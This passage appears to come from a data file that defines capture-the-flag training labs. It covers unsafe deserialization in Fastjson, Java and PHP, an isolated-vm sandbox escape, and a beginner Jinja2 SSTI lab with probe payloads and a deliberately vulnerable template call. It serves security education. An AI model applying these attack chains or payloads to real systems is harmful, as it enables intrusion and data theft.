labs.objective: Upload a poisoned model → worker unpickles it → worker writes /flag.txt contents into the Redis key results:leak → GET /results/leak → submit to /solve.
labs.flag_hint: POST /solve compares the submitted flag against /flag.txt (mounted read-only in the worker container) and returns the flag on match.
labs.inspired_by: JFrog Security Research 2024 disclosures on malicious Hugging Face model pickles

labs.title: Fastjson Deep Chain
labs.description: A payment aggregator uses Fastjson 1.2.83 with safeMode=true and a customized checkAutoType blocklist. The container has NO outbound network. Multi-step: (1) enumerate the allowlisted class graph, (2) bypass safeMode via the internal-class + reference-abuse trick, (3) chain to bundled jython-standalone via disk-write gadgets to stage a payload, (4) execute jython script to read /flag.txt and surface it via the app's own API response.
labs.objective: Bypass safeMode + blocklist using only classes reachable from the allowlist, stage a jython script on disk via chained gadgets, execute it to read /flag.txt, and return the flag through the app's normal HTTP response; submit to /solve.
labs.flag_hint: POST /solve compares the submitted flag against /flag.txt (mounted read-only); container egress is blocked at the iptables layer so exfiltration must happen in-band through the app response.
skills_taught: on-disk JAR/script staging via primitive write gadgets
labs.inspired_by: Kingkk / Y4tacker 2023 Fastjson safeMode bypass research and the disk-write-only gadget line of work

labs.title: BYO Gadget
labs.description: A bespoke Java 17 SaaS ships 60+ POJOs with no known off-the-shelf gadget libs on the classpath. An internal endpoint deserializes user objects. The lab hands the user complete source, a bundled gadgetinspector build, and a Semgrep taint-rule pack, and asks them to discover their own novel chain end-to-end — from magic-method entry to arbitrary invocation sink.
labs.objective: Analyze the shipped source with gadgetinspector + manual review, author a serialized payload that exploits a chain the user discovered inside the application code, achieve RCE, and read /flag.txt; submit to /solve.
labs.flag_hint: POST /solve compares the submitted flag against /flag.txt and returns the flag on match; multiple solution chains exist in the codebase — the platform accepts any of them.
skills_taught: static taint analysis for deserialization sinks
labs.inspired_by: Ian Haken 2018 'Automated Discovery of Deserialization Gadget Chains' (BlackHat USA)

labs.title: Isolated-vm, Not Really
labs.description: A serverless-style JS runner uses isolated-vm@4.6.0 to run untrusted snippets. Chain: (1) prototype-pollution inside the snippet's own realm, (2) confuse the ExternalCopy/Reference marshalling boundary to leak a host-realm object, (3) pivot to a host-realm require, (4) escape the isolate, (5) readFileSync('/flag.txt') and return the value as the snippet result.
labs.objective: Escape the isolated-vm sandbox by chaining prototype pollution → cross-realm reference leak → host escape → fs.readFileSync('/flag.txt'), and return the flag as the eval-endpoint's response body; submit to /solve.
labs.flag_hint: POST /solve compares the submitted flag body against /flag.txt (mounted only on the host filesystem outside the isolate) and returns the flag on match.
labs.inspired_by: 2024 isolated-vm sandbox escape research (cross-realm prototype pollution disclosures)

labs.title: Chain the Chain
labs.description: An e-commerce store deserializes a base64 'wishlist' object from a cookie. ModSecurity CRS4 blocks common PHPGGC class-name prefixes. Multi-step: (1) smuggle class names past the WAF using namespace-alias / short-name tricks, (2) chain a Symfony/RCE gadget with a Doctrine/FW1 gadget to write a phar into /tmp, (3) trigger phar dereference via the profile-picture endpoint's is_file() call, (4) execute the embedded second gadget to land a shell and read /flag.txt.
labs.objective: Bypass the WAF-visible serialized-object surface, stage a phar on disk via one chain, trigger phar dereference via a separate endpoint's is_file() sink, land RCE, read /flag.txt, and submit to /solve.
labs.flag_hint: POST /solve compares the submitted flag against /flag.txt (mounted read-only) and returns the flag on match.
skills_taught: phar staging vs phar trigger separation
labs.inspired_by: Ambionics Security blog series on chained POP exploitation (Charles Fol write-ups)

labs.title: Hello, {{7*7}} — Your First SSTI
labs.description: A Flask 'personalized greeting' app renders the ?name= query parameter directly into a Jinja2 template via render_template_string(f'Hello, {name}!'). No filters, no sandbox — the classic textbook mistake. Users learn to detect SSTI with the polyglot payload {{7*7}} and confirm the engine by testing {{7*'7'}} (49 vs. seven 7s → Jinja2/Twig differentiation). Once confirmed, they leak the Flask config object with {{config}} which contains a SECRET_KEY masked as the flag.
